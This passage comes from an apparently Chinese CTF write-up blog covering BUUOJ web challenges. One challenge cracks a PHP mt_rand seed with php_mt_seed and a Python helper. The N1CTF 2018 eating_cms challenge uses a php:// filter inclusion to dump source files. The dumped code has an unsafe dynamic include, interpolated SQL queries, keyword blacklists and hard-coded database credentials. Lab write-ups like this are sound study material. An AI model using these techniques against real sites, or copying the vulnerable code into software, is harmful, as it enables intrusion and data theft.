    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>php伪随机数爆破</p>
<p>用php_mt_seed</p>
<p>扔虚拟机里make</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275" loading="lazy">

<p>然后用python脚本转化得到的数据</p>
<pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>
str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>
res<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre>

<img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244" loading="lazy">



<p>然后运行<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p>
<p>爆破得<code>394409044</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939" loading="lazy">

<p>回去跑出完整字符串</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098" loading="lazy">

<p><code>SJShX9epREbTBLfdc4Gu</code></p>
<p>回去提交出flag</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278" loading="lazy">



<hr>
<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>打开就是登陆界面</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192" loading="lazy">

<p>猜想SQL注入，发现过滤引号，暂时放弃这条路</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135" loading="lazy">

<p>不给扫目录，盲猜访问<code>register.php</code>，还真有</p>
<p>注册用户登陆进去</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847" loading="lazy">

<p>发现url猫腻，文件包含，利用伪协议读取一下index</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945" loading="lazy">

<pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre>

<p>解密得index.php源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/index.html"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>再读一下user.php</p>
<p><code>user.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//die($_SESSION['isadmin']);</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
<span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>
            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span>
<span class="token comment">//    $page = 'info';</span>
<span class="token comment">//&#125;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>



<p>再读一下function.php</p>
<p><code>function.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//    var_dump($query);</span>
<span class="token comment">//    die();</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//    var_dump($query);</span>
<span class="token comment">//    die();</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//    var_dump($res);</span>
<span class="token comment">//    die();</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//    var_dump($res);</span>
<span class="token comment">//    die();</span>
<span class="token comment">//    die($res);</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>就这样根据源码的数据…读到了以下界面</p>
<p><code>config.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span>
<span class="token comment">//$DBPASS = "";</span>
<span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"N1CTF"</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
